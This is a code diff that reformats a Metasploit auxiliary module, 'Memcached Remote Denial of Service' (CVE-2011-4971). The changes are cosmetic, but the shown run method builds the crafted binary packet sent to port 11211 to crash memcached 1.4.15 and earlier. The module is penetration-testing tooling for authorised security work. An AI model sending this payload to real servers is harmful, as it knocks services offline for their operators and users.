@@ -8,21 +8,23 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Memcached Remote Denial of Service',
-      'Description'   => %q{
-        This module sends a specially-crafted packet to cause a
-        segmentation fault in memcached v1.4.15 or earlier versions.
-      },
-      'References' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Memcached Remote Denial of Service',
+        'Description' => %q{
+          This module sends a specially-crafted packet to cause a
+          segmentation fault in memcached v1.4.15 or earlier versions.
+        },
+        'References' => [
           [ 'URL', 'https://code.google.com/p/memcached/issues/detail?id=192' ],
           [ 'CVE', '2011-4971' ],
           [ 'OSVDB', '92867' ]
         ],
-      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
-      'License'      => MSF_LICENSE
-    ))
+        'Author' => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options([Opt::RPORT(11211),])
   end
@@ -40,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     connect
-    pkt =  "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00"
+    pkt = "\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00"
     pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00"
     pkt << "\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     pkt << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
